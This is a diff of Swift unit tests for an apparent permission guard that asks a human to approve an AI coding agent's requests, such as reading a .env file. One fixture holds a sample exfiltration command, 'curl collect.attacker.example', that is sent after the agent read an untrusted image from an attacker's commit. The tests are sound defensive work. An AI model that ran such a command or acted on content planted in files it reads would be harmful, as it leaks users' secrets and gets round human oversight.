@@ -6,10 +6,10 @@ final class GuardReviewTests: XCTestCase {
     let pending = GuardPending(id: "request", agent: "claude", tool: "Read", path: "/workspace/app/.env", ruleID: "env-files", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "exact", expiry: "24h")], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session")
     let sendAfterImage = GuardPending(id: "send", agent: "claude", tool: "Bash", path: "curl collect.attacker.example", ruleID: "untrusted-egress", ts: "", scopeText: nil, advisor: nil, availableScopes: [.init(kind: "once", expiry: nil), .init(kind: "session", expiry: nil)], readerExe: "/bin/claude", workspace: "/workspace/app", sessionID: "session", detail: "This session read untrusted content: image /workspace/app/docs/build-spec.png, committed by Mallory <mallory@attacker.example> in app@c405510 on 2026-10-28 (docs: add build spec diagram). It now sends data out: curl collect.attacker.example.")
 
-    func testFutureConfirmationBindsRecordedIdentityAndSelectedLifetime() throws {
-        let text = try XCTUnwrap(pending.confirmation(scope: "exact", expiry: "24h"))
-        for fact in ["Read", "/workspace/app/.env", "/workspace/app", "/bin/claude", "24 hours", "signatures are not verified"] { XCTAssertTrue(text.contains(fact), fact) }
-        XCTAssertNil(pending.confirmation(scope: "exact", expiry: "7d"))
+    func testGrantTermsNameTheSelectedLifetimeAndLimits() throws {
+        let text = try XCTUnwrap(pending.grantTerms(scope: "exact", expiry: "24h"))
+        for fact in ["this file and tool", "24 hours", "signatures are not verified", "File approval does not authorize network access."] { XCTAssertTrue(text.contains(fact), fact) }
+        XCTAssertNil(pending.grantTerms(scope: "exact", expiry: "7d"))
         XCTAssertFalse(pending.requestFacts.contains("Why:"))
     }
 
@@ -19,8 +19,8 @@ final class GuardReviewTests: XCTestCase {
         XCTAssertTrue(sendAfterImage.requestFacts.contains("Resource: curl collect.attacker.example"))
         XCTAssertEqual(AppState.guardPromptHeadline(sendAfterImage), "Claude wants to send data out after reading untrusted content")
         XCTAssertEqual(AppState.guardPromptHeadline(pending), "Claude requests Read access")
-        let text = try XCTUnwrap(sendAfterImage.confirmation(scope: "session", expiry: nil))
-        XCTAssertTrue(text.hasPrefix("Allow these sends from this tool until this session ends."), text)
+        let text = try XCTUnwrap(sendAfterImage.grantTerms(scope: "session", expiry: nil))
+        XCTAssertTrue(text.hasPrefix("Allows these sends from this tool until this session ends."), text)
         XCTAssertTrue(text.contains("Other sends still ask."))
         XCTAssertFalse(text.contains("File approval"))
     }
@@ -75,17 +75,21 @@ final class GuardReviewTests: XCTestCase {
     }
 
     @MainActor
-    func testCancelledConsentAndExpiredRequestDoNotWrite() async {
+    func testUnansweredPromptAndExpiredRequestDoNotWrite() async {
         let client = StubDaemonClient()
         client.pending = [pending]
         let state = AppState(client: client)
         state.seedPostureForTesting(nil, pendingGuard: pending)
-        await state.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h", confirm: { _ in false })
+        state.runGuardPrompt = { _ in .withdrawn }
+        await state.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h")
         XCTAssertTrue(client.guardResolveCalls.isEmpty)
+        let expired = AppState(client: client)
+        expired.seedPostureForTesting(nil, pendingGuard: pending)
+        expired.runGuardPrompt = { $0.selected.map { .allow($0) } ?? .deny }
         client.pending = []
-        await state.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h", confirm: { _ in true })
+        await expired.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h")
         XCTAssertTrue(client.guardResolveCalls.isEmpty)
-        XCTAssertEqual(state.guardRequestNotice, "Request no longer pending. No answer was submitted.")
+        XCTAssertEqual(expired.guardRequestNotice, "Request no longer pending. No answer was submitted.")
     }
 
     @MainActor
@@ -94,7 +98,8 @@ final class GuardReviewTests: XCTestCase {
         client.pending = [pending]
         let state = AppState(client: client)
         state.seedPostureForTesting(nil, pendingGuard: pending)
-        await state.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h", confirm: { _ in true })
+        state.runGuardPrompt = { $0.selected.map { .allow($0) } ?? .deny }
+        await state.resolvePendingGuard(id: "request", verdict: "allow", scope: "exact", expiry: "24h")
         XCTAssertEqual(client.guardResolveCalls.count, 1)
         XCTAssertEqual(client.guardResolveCalls.first?.id, "request")
         XCTAssertEqual(client.guardResolveCalls.first?.expiry, "24h")
